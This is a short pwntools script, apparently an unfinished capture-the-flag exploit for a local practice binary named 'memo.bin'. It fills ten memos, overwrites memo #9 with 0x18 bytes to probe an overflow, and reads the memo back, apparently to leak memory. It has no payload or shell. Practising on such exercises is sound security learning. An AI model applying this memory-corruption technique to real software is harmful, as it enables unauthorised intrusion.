#!/usr/bin/python3

from pwn import *


def exploit():
    # Write your exploit logic here.
    p = process("./memo.bin")

    print(p.recvuntil(b"(Enter W/R/M/E): "))
    p.sendline(b"W")
    print(p.recvuntil(b"#0: "))
    p.sendline(b"a")
    print(p.recvuntil(b"(Enter W/R/M/E): "))
    p.sendline(b"W")
    print(p.recvuntil(b"#1: "))
    p.sendline(b"a")
    print(p.recvuntil(b"(Enter W/R/M/E): "))
    p.sendline(b"W")
    print(p.recvuntil(b"#2: "))
    p.sendline(b"a")
    print(p.recvuntil(b"(Enter W/R/M/E): "))
    p.sendline(b"W")
    print(p.recvuntil(b"#3: "))
    p.sendline(b"a")
    print(p.recvuntil(b"(Enter W/R/M/E): "))
    p.sendline(b"W")
    print(p.recvuntil(b"#4: "))
    p.sendline(b"a")
    print(p.recvuntil(b"(Enter W/R/M/E): "))
    p.sendline(b"W")
    print(p.recvuntil(b"#5: "))
    p.sendline(b"a")
    print(p.recvuntil(b"(Enter W/R/M/E): "))
    p.sendline(b"W")
    print(p.recvuntil(b"#6: "))
    p.sendline(b"a")
    print(p.recvuntil(b"(Enter W/R/M/E): "))
    p.sendline(b"W")
    print(p.recvuntil(b"#7: "))
    p.sendline(b"a")
    print(p.recvuntil(b"(Enter W/R/M/E): "))
    p.sendline(b"W")
    print(p.recvuntil(b"#8: "))
    p.sendline(b"a")
    print(p.recvuntil(b"(Enter W/R/M/E): "))
    p.sendline(b"W")
    print(p.recvuntil(b"#9: "))
    p.sendline(b"a")
    print(p.recvuntil(b"(Enter W/R/M/E): "))
    p.sendline(b"M")
    print(p.recvuntil("modify: "))
    p.sendline(b"9")
    print(p.recvuntil("#9: "))
    p.sendline(b"a" * 0x18)
    print(p.recvuntil(b"(Enter W/R/M/E): "))
    p.sendline(b"R")
    print(p.recvuntil(b"read: "))
    p.sendline(b"9")
    p.recvline()
    p.recvline()
    p.recvline()
    p.recvline()
if __name__ == "__main__":
    exploit()
